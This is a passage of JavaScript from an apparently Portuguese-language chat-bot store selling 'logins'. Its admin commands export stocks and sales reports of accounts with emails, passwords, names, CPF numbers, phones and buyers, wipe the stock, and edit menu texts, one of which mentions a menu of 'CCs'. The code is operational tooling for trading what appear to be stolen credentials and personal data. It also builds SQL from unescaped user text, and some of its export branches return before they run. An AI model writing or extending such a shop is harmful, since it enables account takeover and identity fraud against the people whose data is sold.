        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/relatoriovendalogin") > -1 && Adms.includes(Numero)) {
            Texto = `*GERANDO RELATÓRIO DE VENDAS DE LOGINS...*`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM LOGINS_VENDIDOS`).all();
            //shuffle(Array_MATERIAL);

            today = new Date();
            today.setHours(today.getHours() + 0);
            Nome_File_Visual = `${Nome_Dono} ${Array_MATERIAL.length} Logins vendidos Data ${today}.txt`
            Nome_File_Visual = Nome_File_Visual.replace(/\\/igm, '/');
            Nome_File_Visual = Nome_File_Visual.replace(/\s\(Horário Padrão de Brasília\)/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\sGMT\-0300/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');

            Nome_File = __dirname + `\\MISC\\${Nome_File_Visual}`

            //console.log(Nome_File_Visual)
            //console.log(Nome_File)

            message = fs.createWriteStream(Nome_File);
            for (var index = 0; index < Array_MATERIAL.length; index++) {
                console.log(`${Array_MATERIAL[index]["SERVICO"]};${Array_MATERIAL[index]["EMAIL"]};${Array_MATERIAL[index]["SENHA"]};${Array_MATERIAL[index]["NOME"]};${Array_MATERIAL[index]["CPF"]};${Array_MATERIAL[index]["USER"]};${Array_MATERIAL[index]["TELEFONE"]};${Array_MATERIAL[index]["ESTADO"]};${Array_MATERIAL[index]["CIDADE"]};${Array_MATERIAL[index]["ADICIONAIS"]};${Array_MATERIAL[index]["PRECO"]}`)
                message.write(`SERVIÇO: ${Array_MATERIAL[index]["SERVICO"]}
EMAIL: ${Array_MATERIAL[index]["EMAIL"]}
SENHA: ${Array_MATERIAL[index]["SENHA"]}
NOME: ${Array_MATERIAL[index]["SERVICO"]}
CPF: ${Array_MATERIAL[index]["CPF"]}
USER: ${Array_MATERIAL[index]["USER"]}
TELEFONE: ${Array_MATERIAL[index]["TELEFONE"]}
ESTADO: ${Array_MATERIAL[index]["ESTADO"]}
CIDADE: ${Array_MATERIAL[index]["CIDADE"]}
VALOR: ${Array_MATERIAL[index]["PRECO"]}
COMPRADOR: ${Array_MATERIAL[index]["NUMERO_COMPRADOR"]}
DATA DA COMPRA: ${new Date(parseInt(Array_MATERIAL[index]["DATA_MS_INSERIDO"])).toLocaleString()}
ADICIONAIS: ${Array_MATERIAL[index]["ADICIONAIS"]}

❁ ════ ❃•❃ ════ ❁`);
                if (index === parseInt(Array_MATERIAL.length) - 1) {
                    //console.log("Foi")
                    await delay(2000)
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendFile',
'${Nome_File_Visual}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${Nome_File}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/baixarestoquelogin") > -1 && Adms.includes(Numero)) {
            Texto = `Gerando arquivo...`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM LOGINS`).all();
            //shuffle(Array_MATERIAL);

            today = new Date();
            today.setHours(today.getHours() + 0);
            Nome_File_Visual = `${Nome_Dono} ${Array_MATERIAL.length} Logins Data ${today}.txt`
            Nome_File_Visual = Nome_File_Visual.replace(/\\/igm, '/');
            Nome_File_Visual = Nome_File_Visual.replace(/\s\(Horário Padrão de Brasília\)/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\sGMT\-0300/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');

            Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`

            //console.log(Nome_File_Visual)
            //console.log(Nome_File)

            message = fs.createWriteStream(Nome_File);
            for (var index = 0; index < Array_MATERIAL.length; index++) {
                console.log(`${Array_MATERIAL[index]["SERVICO"]}|${Array_MATERIAL[index]["EMAIL"]}|${Array_MATERIAL[index]["SENHA"]}|${Array_MATERIAL[index]["NOME"]}|${Array_MATERIAL[index]["CPF"]}|${Array_MATERIAL[index]["USER"]}|${Array_MATERIAL[index]["TELEFONE"]}|${Array_MATERIAL[index]["ESTADO"]}|${Array_MATERIAL[index]["CIDADE"]}|${Array_MATERIAL[index]["ADICIONAIS"]}|${Array_MATERIAL[index]["PRECO"]}`)
                message.write(`${Array_MATERIAL[index]["SERVICO"]}|${Array_MATERIAL[index]["EMAIL"]}|${Array_MATERIAL[index]["SENHA"]}|${Array_MATERIAL[index]["NOME"]}|${Array_MATERIAL[index]["CPF"]}|${Array_MATERIAL[index]["USER"]}|${Array_MATERIAL[index]["TELEFONE"]}|${Array_MATERIAL[index]["ESTADO"]}|${Array_MATERIAL[index]["CIDADE"]}|${Array_MATERIAL[index]["ADICIONAIS"]}|${Array_MATERIAL[index]["PRECO"]}\n`);
                if (index === parseInt(Array_MATERIAL.length) - 1) {
                    //console.log("Foi")
                    await delay(2000)
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendFile',
'${Nome_File_Visual}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${Nome_File}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto === "/deletarestoquelogin" && Adms.includes(Numero)) {
            await DataBase_Better.prepare(`DELETE FROM LOGINS`).run();
            Texto = `*ESTOQUE DE LOGINS DELETADO COM SUCESSO!*`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textomenulogin===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                TEXTO_MENU_LOGIN = msg[1]
                TEXTO_MENU_LOGIN = TEXTO_MENU_LOGIN.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MENU_LOGIN}' WHERE PARAMETRO = 'TEXTO_MENU_LOGIN'`).run()

                Texto = `*TEXTO DO MENU DE CCs ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textocomproulogin===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                MENSAGEM_AO_COMPRAR_LOGIN = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${MENSAGEM_AO_COMPRAR_LOGIN}' WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_LOGIN'`).run()

                Texto = `*TEXTO A EXIBIR QUANDO CLIENTE COMPRAR LOGIN, ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/modevendalogin===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'MODO_VENDA_LOGIN'`).run()
                Texto = `*MODO DE VENDA LOGIN MAIS SIMPLES E RÁPIDO.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "2") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '2' WHERE PARAMETRO = 'MODO_VENDA_LOGIN'`).run()
                Texto = `*MODO DE VENDA DE LOGIN MAIS DETALHADO.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
